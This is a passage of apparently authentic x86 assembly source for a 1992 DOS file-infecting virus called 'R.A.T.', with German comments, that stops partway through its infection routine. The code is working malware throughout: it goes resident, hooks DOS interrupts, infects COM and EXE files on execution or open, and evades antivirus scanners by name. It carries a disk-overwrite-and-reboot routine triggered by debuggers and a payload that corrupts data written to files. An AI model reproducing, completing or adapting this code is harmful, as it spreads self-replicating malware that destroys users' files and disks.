            TITLE  R.A.T. [R]iots [A]gainst [T]echnology !!

;(c) 1992 by the Priest und DR. ET.

;浜様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様融
;� Variablen-Vereinbarungen:                                                  �
;藩様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様夕
ANZBYTES  EQU VIR_END-VIRUS             ;朕
;              敖�      青�               �
;  Ende des Virus       Start des Virus   �
;                                         
; L�nge von [R].[A].[T]., Anzahl Bytes zwischen VIR_END und VIRUS
;
FAKTOR    EQU 100H+8         ;陳> Anpassungsfaktor, relativ zur Adresse Null
;              青 Programm-Offset
;                                           敖> Maximale gr�sse der zu...
MAXGR     EQU 0FFFFH-(ANZBYTES+100H+20H)  ;潰   ...infizierenden Dateien
;                  Offset 100H 陳�   �
;                            Stack 陳�
;
BUFSIZE   EQU IMMUN-VIR_END             ;陳> Gr��e des Ausgelagerten RAM
;
MEM_ALLOC EQU (ANZBYTES+BUFSIZE)/10H+1  ;陳> In Paragraphen zu 16 Bytes
;  
;  青 L�nge des residenten Virus
;
MCB_PSP   EQU 1               ;陳> Zeiger auf den zum Prog geh�renden PSP
MCB_SIZE  EQU 3               ;陳> L�nge des zum MCB geh�renden Speichers
;  
;  青 Alles Zeiger auf die verschiedenen MCB-Eintr�ge...
;
PSP_MEM   EQU 2               ;陳> Beinhaltet (im PSP) die Endadresse des durch
;                                  das Programm belegten Speichers!
;
TNT_WORD  EQU "sM"            ;陳> TNT- und CPAV-Immun-Kenn-Bytes ("Ms"Dos).
ID_WORD   EQU "Vi"            ;陳> Kenn-Bytes des "Vi"rus.

;浜様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様融
;� PUSHALL: Regs auf dem Stack sichern:                                       �
;藩様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様夕
PUSHALL   MACRO                         ;Alle REGs auf dem STACK sichern

          PUSHF
          PUSH AX
          PUSH BX
          PUSH CX
          PUSH DX
          PUSH DS
          PUSH ES
          PUSH DI
          PUSH SI
          PUSH BP

          ENDM

;浜様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様融
;� POPALL: Reg vom Stack holen, gepushten Regs restaurieren                   �
;藩様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様夕
POPALL    MACRO                         ;Alle REGs vom STACK zur�ckholen

          POP BP
          POP SI
          POP DI
          POP ES
          POP DS
          POP DX
          POP CX
          POP BX
          POP AX
          POPF

          ENDM

;==============================================================================

CODE SEGMENT PARA 'CODE'

ASSUME CS:CODE, DS:CODE, ES:CODE

ORG 100H

;浜様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様融
;�                      Infiziertes Host-(Vor-)programm                       �
;藩様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様夕
START:    JMP VIRUS           ;Sprung zum Virus
          NOP                 ;Mach die 3 BYTES voll
          MOV AX,4C00H        ;...dann das
          INT 21H             ;Prog beenden!

;浜様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様融
;� Start des Virus-Codes:                                                     �
;藩様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様夕
;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� OFFSET des Virus feststellen, SEGMENT-Register setzen:                     �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
VIRUS:    CALL IP_TEST                  ;IP herausfinden, jetzt auf dem STACK!
IP_TEST:  POP BP                        ;jetzt IP in <BP>
          SUB BP,3                      ;<BP> auf den Anfang des Virus...

          PUSH DS                       ;<DS> sichern (und somit auch <ES> !!!)

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Debugger-Test:                                                             �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          XOR AX,AX                     ;<DS> auf...
          MOV DS,AX                     ;...NULL setzen
          LES BX,DS:[4]                 ;<DS> und <BX> mit Vektor von INT 1
          CMP BYTE PTR ES:[BX],0CFH     ;Zeigt der Vektor auf einen IRET?
          JZ NO_BUG                     ;NEIN --> NO_BUG!

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Debugger ist gerade aktiv, tod der FAT, und dann nen Reset!                �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          MOV BYTE PTR ES:[BX],0CFH     ;INT 1 erst mal auf nen IRET!
          MOV AX,0380H                  ;Ersten...
          MOV DX,0080H                  ;...128 Sektoren...
          MOV CX,0001H                  ;der Festplatte 1...
          ;INT 13H                       ;...�berschreiben
          MOV AX,0381H                  ;Und die 2. Platte...
          ;INT 13H                       ;...auch noch!

          JMP DWORD PTR DS:[19H*4]      ;JMP zur RESET-Routine (INT 19H) !

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� SEG-REGs + Flags setzen:                                                   �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
NO_BUG:   PUSH CS                       ;<DS> und <ES> auf <CS> setzen:
          POP DS                        ;<-- (s.o.)
          PUSH CS                       ;<-- (s.o.)
          POP ES                        ;<-- (s.o.)

          CLD                           ;Aufsteigend (Stringmanipulation)

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� COM- oder EXE-Strategie:                                                   �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          CMP BYTE PTR CS:[OFFSET COMEXE-FAKTOR+BP],1 ;COM oder EXE zum beenden
          JZ EXE_STRT                   ;--> EXE-Konform starten

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� COM: Start-BYTES des Hostprogs restaurieren, r�cksprung setzen:            �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          MOV WORD PTR CS:[OFFSET HOST_SEG-FAKTOR+BP],CS    ;SEG auf <CS>

          MOV SI,OFFSET PUFFER-FAKTOR   ;Quelle
          ADD SI,BP                     ;OFS anpassen
          MOV DI,100H                   ;Ziel
          MOV CX,3                      ;3 Durchl�ufe
          REP MOVSB                     ;Kopieren!
          JMP TEST_VIR                  ;--> TEST_VIR

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� EXE: R�cksprung zum Host vorbereiten:                                      �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
EXE_STRT: MOV AX,CS                     ;Aktuelles <CS>
EXE_SEG:  SUB AX,0                      ;R�cksprung vorbereiten (SEG)
          MOV CS:[HOST_SEG-FAKTOR],AX   ;Differnez zw. Virus-<CS> und Host-<CS>

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� T E S T : Schon installiert?                                               �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
TEST_VIR: MOV DX,ID_WORD                ;ID_WORD in <DX>
          MOV AH,30H                    ;DOS Versionsnummer ermitteln
          INT 21H                       ;Pr�f-Int aufrufen
          INC DX                        ;Erh�hen...Installiert?
          JNZ MEM_TEST                  ;NEIN --> MEM_TEST
F_ENDE:   JMP ENDE                      ;JA --> ENDE

;浜様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様融
;�                        Resident MACHEN des Virus                           �
;藩様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様夕

MEM_TEST: MOV AH,48H                    ;RAM-Speicher reservieren
          MOV BX,MEM_ALLOC              ;Ben�tigte gr��e...
          INT 21H                       ; --> O.K. ?... (dann SEG in <AX>)
          JNC ALLOC_OK                  ;JAAA --> MEM_ALLOC

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Vom HOST-Programm Speicher klauen:                                         �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          POP AX                        ;<DS> vom STACK in <AX>
          PUSH AX                       ;<DS> wieder sichern
          DEC AX                        ;<ES> auf den MCB...
          MOV ES,AX                     ;...zeigen lassen
          MOV BX,WORD PTR ES:[MCB_SIZE] ;Gr��e des Speicher-Blocks ermitteln
          SUB BX,MEM_ALLOC+1            ;Speicher weniger MEM_ALLOC

          POP ES                        ;<ES> wieder auf...
          PUSH ES                       ;...<DS> setzen und <DS> wieder sichern
          MOV AH,4AH                    ;Gr��e eines Speicherbereiches �ndern
          INT 21H                       ;<BX>=neue Gr��e / <ES>=SEG des RAM-Blocks
          JC F_ENDE                     ;Geht nich --> ENDE

          MOV AH,48H                    ;RAM-Speicher reservieren
          MOV BX,MEM_ALLOC              ;Ben�tigte gr��e...
          INT 21H                       ; --> O.K. ?... (dann SEG in <AX>)
          JC ENDE                       ;Schade --> ENDE

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� PSP-Eintrag (verf�gbarer Speicher) des Hosts aktualisieren:                �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
ALLOC_OK: SUB WORD PTR ES:[PSP_MEM],MEM_ALLOC+1 ;belegten Speicher minus Virus

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� SEG-Adr des reservierten Speichers in <ES>                                 �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          MOV ES,AX                     ;<ES> auf den reservierten Speicher-
                                        ;bereich (Funktion 48H / INT 21H)

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Virus in den SPEICHER kopieren:                                            �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          MOV SI,BP           ;Quelle, auf den Anfang des Virus! [DS:SI]
          XOR DI,DI           ;Ziel (gerade reservierter MCB)    [ES:DI]
          MOV CX,ANZBYTES     ;ANZBYTES Durchl�ufe!
          REP MOVSB           ;Kopieren!

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Speicher als belegt kennzeichnen, Owner (SEG-Adr des zugeh�rigen PSP): 8   �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          DEC AX                        ;<AX>=Reservierter Speicher, jetzt MCB
          MOV DS,AX                     ;<DS> zeigt auf MCB vom allocierten RAM
          MOV WORD PTR DS:[MCB_PSP],8   ;Speicher als belegt gekennzeichnet

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� AKTIV-Flag (Byte) auf NICHT AKTIV!!!                                       �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          MOV BYTE PTR ES:[OFFSET AKTIV-FAKTOR],0 ;Aktiv-FLAG auf Null!!!

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Vektoren umbiegen:                                                         �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          PUSH ES                       ;<DS> auf den neu reservierten...
          POP DS                        ;...Speicher setzen... (<ES>!!!)

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Alten INT 13H merken:                                                      �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          MOV AX,3513H                  ;Vektor von INT 21 lesen
          INT 21H
          MOV WORD PTR DS:[OFFSET ALT13-FAKTOR],BX    ;Alten Vektor sichern
          MOV WORD PTR DS:[OFFSET ALT13-FAKTOR+2],ES  ;(--> OFS und SEG)

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� INT 21H umbiegen:                                                          �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
;------------------------------------------------------------------------------
; Aufruf von INT 21H 陳> Vektor zeigt auf das 5.BYTE des ersten MCB 陳> JMP
; 陳> Sprung zum eigentlichen Virus... INT 21H zeigt somit in den 1. MCB
;------------------------------------------------------------------------------
          MOV AH,52H                    ;DOS INFORMATION BLOCK (DIB) ermitteln
          INT 21H                       ;...undokumentiert
          MOV AX,ES                     ;<ES> in <AX>
          DEC AX                        ;<AX> verkleinern
          MOV ES,AX                     ;<ES> somit verkleinert!
          ADD BX,12                     ;...OFS auf die Adr. des ersten MCB
          LES BX,ES:[BX]                ;Adr. des ersten MCB in <ES>/<BX>

          ADD BX,5                      ;OFS auf das 1. ungenuzte BYTE im MCB
          MOV BYTE PTR ES:[BX],0EAH     ;JMP setzen (Direct intersegment)
          MOV WORD PTR ES:[BX+1],OFFSET NEU21-FAKTOR  ;OFS setzen
          MOV WORD PTR ES:[BX+3],DS     ;SEG setzen!
;------------------------------------------------------------------------------
          MOV DX,BX                     ;OFS vorbereiten f�r INT neu setzen
          PUSH ES                       ;SEG sichern (f�r INT neu setzen...)
;------------------------------------------------------------------------------
          MOV AX,3521H                  ;Vektor von INT 21 lesen
          INT 21H
          MOV WORD PTR DS:[OFFSET ALT21-FAKTOR],BX    ;Alten Vektor sichern
          MOV WORD PTR DS:[OFFSET ALT21-FAKTOR+2],ES  ;(--> OFS und SEG)

          MOV AX,2521H                  ;INT 21H neu setzen
          POP DS                        ;SEG des MCB in <DS>      
          INT 21H                       ;OFS in <DX> (siehe oben 潰)

;------------------------------------------------------------------------------
; <ES> und <DS> restaurieren:
;------------------------------------------------------------------------------
ENDE:     POP DS                        ;<DS> und <ES> restaurieren
          PUSH DS                       ;<--- (s.o.)
          POP ES                        ;<--- (s.o.)

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Virus beenden (COM oder EXE..? s.o...):                                    �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          DB 0EAH                       ;Direct Intersegment Jmp...
HOST_OFS  DW 0100H                      ;OFS-ADR f�r den R�cksprung zum Host
HOST_SEG  DW ?                          ;SEG-ADR f�r den R�cksprung zum Host

;浜様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様融
;� Neuer INT 24H (Critical Error) Handler:                                    �
;藩様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様夕
NEU24     PROC FAR                      ;Kritischer Fehler

          MOV AL,3                      ;Aktuelle Funktion abbrechen...
          IRET                          ;Zur�ck zur fehlerhaften Funktion.

NEU24     ENDP

;浜様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様�
;� Neuer INT 21H (Dos-Calls) Handler;                                          �
;藩様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様�
NEU21     PROC FAR                      ;DOS-INT

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Schon installiert ? Test �ber Versionsnummer, bei Erfolg: <DX> = 0FFFFH    �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          CMP AH,30H                    ;DOS Versionsnummer ermitteln ?
          JNZ VIR_21                    ;NEIN --> VIR_21
          CMP DX,ID_WORD                ;<DX> gleich ID_WORD?
          JNZ VIR_21                    ;NEIN --> VIR_21
          MOV DX,0FFFFH                 ;Pr�fbyte in <DX> zur�ckliefern...

          IRET                          ;Virus schon drin --> INT beenden

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Virus laufen lassen...                                                     �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
VIR_21:   PUSHALL                       ;Register sichern
          CMP BYTE PTR CS:[OFFSET AKTIV-FAKTOR],0 ;Virus schon AKTIV ?
          JNZ END21                     ;JA (Schon aktiv !) --> END21

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Trigger testen:                                                            �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          CMP AH,40H                    ;Funktion=Datei schreiben?
          JE TRIG_OK                    ;JA --> TRIG_OK

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� EXEC oder OPEN ?                                                           �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          CMP AX,4B00H                  ;EXEC-Aufruf ?
          JE GO_INF                     ;JA --> GO_INF

          CMP AH,3DH                    ;Datei �ffnen ?
          JNE END21                     ;NEIN --> END21

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� EXE oder COM oder keins von beidem?                                        �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
GO_INF:   MOV BYTE PTR CS:[OFFSET AKTIV-FAKTOR],1 ;Virus ist jetzt AKTIV !!!
;------------------------------------------------------------------------------
          MOV DI,DX                     ;<DI> mit OFS des Programmnamens laden

FIND_END: INC DI                        ;<DI> auf das n�chste Zeichen
          JZ NEU21END                   ;<DI> wieder Null? JA --> NEU21END
          CMP BYTE PTR DS:[DI],0        ;Ende-Zeichen des Dateinamens?
          JNZ FIND_END                  ;NEIN --> FIND_END
;------------------------------------------------------------------------------
          MOV CX,10                     ;10 Durchl�ufe
          XOR AL,AL                     ;Checksumme in <AX>

MAKE_SUM: DEC DI                        ;Aufs n�chste Zeichen des Dateinamens
          MOV BP,DS:[DI-2]              ;3 Zeichen des...
          MOV BH,DS:[DI]                ;...Dateinamens einlesen (<BP>/<BH>)

          AND BP,0DFDFH                 ;Zeichen in den Regs <BP>/<BH> in...
          AND BH,0DFH                   ;...Gro�schrift umwandeln

          CMP CX,7                      ;Extension abgearbeitet?
          JA EXT_CHK                    ;JA --> END_SUM
;------------------------------------------------------------------------------
          XOR SI,SI                     ;Zeiger auf die SCANNER-Namen

TESTSCAN: CMP BP,WORD PTR CS:[OFFSET SCAN+SI-FAKTOR+1] ;Ersten 2 Chr in <BX>
          JNZ NO_SCAN                   ;NIX... --> NO_SCAN
          CMP BH,BYTE PTR CS:[OFFSET SCAN+SI-FAKTOR] ;N�chsten 2 Chr in <BP>
          JZ NEU21END                   ;SCANNER!!! --> NEU21END
NO_SCAN:  CMP SI,(ANZ_SCAN-1)*3         ;<SI> auf den letzten Eintrag pr�fen
          JZ END_SUM                    ;Alles getestet --> END_SUM
          ADD SI,3                      ;Auf den n�chsten Namen
          JMP TESTSCAN                  ;--> TESTSCAN

;------------------------------------------------------------------------------
EXT_CHK:  ADD AL,BH                     ;Checksumme erh�hen
;------------------------------------------------------------------------------
END_SUM:  LOOP MAKE_SUM                 ;Alle 3 Bytes abarbeiten

;------------------------------------------------------------------------------
          CMP AL,223                    ;Summe = "COM" ?
          JZ F_START                    ;JA --> F_START --> START_ME !
          CMP AL,226                    ;Summe = "EXE" ?
          JNZ NEU21END                  ;NEIN --> NEU21END

F_START:  JMP START_ME                  ;--> START_ME !!!

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� INT 21H-Virus beenden:                                                     �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
NEU21END: MOV BYTE PTR CS:[OFFSET AKTIV-FAKTOR],0 ;Virus ist jetzt NICHT...
                                                  ;...MEHR aktiv!
;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Sprung zum orginal INT 21H Handler:                                        �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
END21:    POPALL                        ;Register laden
          DB 0EAH                       ;Direct Intersegment Jmp...
ALT21     DD ?                          ;Far-ADR f�r den R�cksprung zum INT 21H

;浜様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様融
;� TRIGer_OK:                                                                 �
;藩様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様夕
TRIG_OK:  MOV AL,BYTE PTR CS:[OFFSET KOPIE-FAKTOR] ;LOW-BYTE von KOPIE in <AL>
          AND AL,0111B                  ;Letzten 3 BITs NICHT ausmaskieren
          JNZ END21                     ;NEIN --> END21

          CMP BX,4                      ;Handle=Standard Ausgabe etc?
          JBE END21                     ;JA --> END21

;------------------------------------------------------------------------------
          MOV SI,TXT_SIZ                ;Text-l�nge in <SI>
          MOV BX,DX                     ;OFS des Puffers in <BX>, s.u.

BOESE:    MOV AL,BYTE PTR CS:[SI+OFFSET TEXT-FAKTOR]  ;Text lesen
          XOR AX,SI                     ;Entschl�sseln!
          MOV DI,CX                     ;...und dann in den...
          DEC DI                        ;(Pufferzeiger verkleinern!)
          MOV DS:[DI+BX],AL             ;Puffer schreiben!

          DEC SI                        ;String-Zeiger verkleinern
          JNZ EVIL                      ;NULL? NEIN --> EVIL

          MOV SI,TXT_SIZ                ;Text-l�nge in <SI>

EVIL:     LOOP BOESE                    ;Puffer voll machen!
          JMP END21                     ;...und zur Dose!

;-----------------------------------------------------------------------------
TEXT      DB 000,083,044,066,042,081,040,039,083,091,087,098,099,121,125,047
          DB 075,080,079,116,117,124,120,100,108,057,065,079,065,120,125,119
          DB 078,078,078,076,067,092,006,010,005,009,108,098,107,101,122,015
          DB 121,101,018,113,117,118,125,023,025,024,027,027

TXT_SIZ   EQU 59

;浜様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様融
;� Infektions-Routinen des Virus:                                             �
;藩様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様夕
;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� INT 24H - Kritikal Errorhandler - merken:                                  �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
START_ME: MOV AX,3524H                            ;Vektor von INT 24 lesen
          CALL GODOS                              ;--> Dose direkt callen
          PUSH ES                                 ;SEG vom Vektor sichern
          PUSH BX                                 ;OFS vom Vektor sichern

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Neuen INT 13H - HD/FLOPPY-INT - merken:                                    �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          MOV AL,13H                    ;Vektor von INT 13 lesen, <AH>=35 (s o)
          CALL GODOS                              ;--> Dose direkt callen
          PUSH ES                                 ;SEG vom Vektor sichern
          PUSH BX                                 ;OFS vom Vektor sichern

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Vektoren NEU setzen (Auf die Adressen, bevor der Virus installiert war):   �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          PUSH DS                       ;SEG des Dateinamens (<DS>) gesichert
          PUSH DX                       ;OFS des Dateinamens (<DX>) gesichert

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Kritikal Errorhandler auf eigene Routine umbiegen:                         �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          MOV AX,2524H                  ;INT 24H neu setzen
          PUSH CS                       ;SEG <DS> auf den...
          POP DS                        ;...Wert von <CS> setzen
          MOV DX,OFFSET NEU24-FAKTOR    ;SEG in <DS>
          CALL GODOS                    ;--> Dose direkt callen

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� INT 13H auf alten (vor dem Virus) Vektor setzen:                           �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          LDS DX,DWORD PTR CS:[OFFSET ALT13-FAKTOR] ;Urspr�nglichen 13H-Vektor:
          MOV AL,13H                    ;Neu setzen:<AH>=25 (s.o)
          CALL GODOS                    ;--> Dose direkt callen

;------------------------------------------------------------------------------
          POP DX                        ;<OFS> des Dateinamens restaurieren
          POP DS                        ;<SEG> des Dateinamens restaurieren

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Attribut lesen und neu schreiben:                                          �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          MOV AX,4300H        ;Attribut einer Datei ermitteln           
          CALL GODOS          ;SEG in <DS> und OFS in <DX> (siehe Oben 潰)
          JC REST_FAR         ;FEHLER --> REST_INT

          MOV SI,CX           ;Attribut der Datei in <SI> retten

          MOV AX,4301H        ;Attribut einer Datei setzen
          XOR CX,CX           ;Neues Attribut                           
          CALL GODOS          ;SEG in <DS> und OFS in <DX> (siehe Oben 潰)
          JNC ATTR_OK         ;OK --> ATTR_OK
REST_FAR: JMP REST_INT        ;FEHLER --> REST_INT

ATTR_OK:  PUSH SI                       ;Attribut auf den Stack (merken!)
          PUSH DX                       ;SEG des Dateinamens merken
          PUSH DS                       ;OFS des Dateinamens merken

;敖陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳朕
;� Datei �ffnen:                                                              �
;青陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳潰
          MOV AX,3D12H                  ;Datei �ffnen, <AL>=Zugriffsmodus
          CALL GODOS                    ;SEG des FNamens in <DS>, OFS in <DX>
